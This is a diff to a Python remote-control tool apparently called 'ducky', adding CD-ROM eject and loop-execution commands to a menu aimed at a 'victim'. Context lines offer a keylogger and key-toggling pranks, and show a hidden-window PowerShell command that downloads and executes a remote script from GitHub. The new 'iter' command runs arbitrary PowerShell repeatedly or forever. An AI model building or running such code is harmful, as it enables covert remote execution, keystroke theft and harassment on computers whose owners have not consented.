@@ -128,6 +128,8 @@ while not stop:
             print("ducky/keylogger      \"timeout\"    Execute a keylogger, leave blank for indefinite")
             print("ducky/capslock       N/A          Prank the victim with a toggling caps lock")
             print("ducky/escape         N/A          Prank the victim with a toggling escape key")
+            print("ducky/cdrom          N/A          Eject the cdrom drive")
+            print("ducky/iter           \"#\" {\"code\"} Run the powershell code a specified # of times")
             stdin = ""
         elif ducky_command[:4] == "quit":
             options = [x for x in ducky_command.split(" ")[1:] if x]
@@ -227,6 +229,18 @@ while not stop:
         elif ducky_command[:6] == "escape":
             commands = []
             commands.append("start-process powershell -argument \'-windowstyle hidden -command iex (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/capslock).content\'")
+            stdin = "; ".join(commands)
+        elif ducky_command[:5] == "cdrom":
+            commands = []
+            commands.append("(new-object -com \"WMPlayer.OCX.7\").cdromcollection.item(0).eject()")
+            stdin = "; ".join(commands)
+        elif ducky_command[:4] == "iter":
+            options = [x for x in ducky_command.split(" ")[1:] if x]
+            commands = []
+            if options[0] == "0":
+                commands.append("while($true)" + options[1])
+            else:
+                commands.append("1.." + options[0] + " | % " + options[1])
             stdin = "; ".join(commands)
         else:
             print("Ducky command not recognized: \"" + ducky_command + "\"")
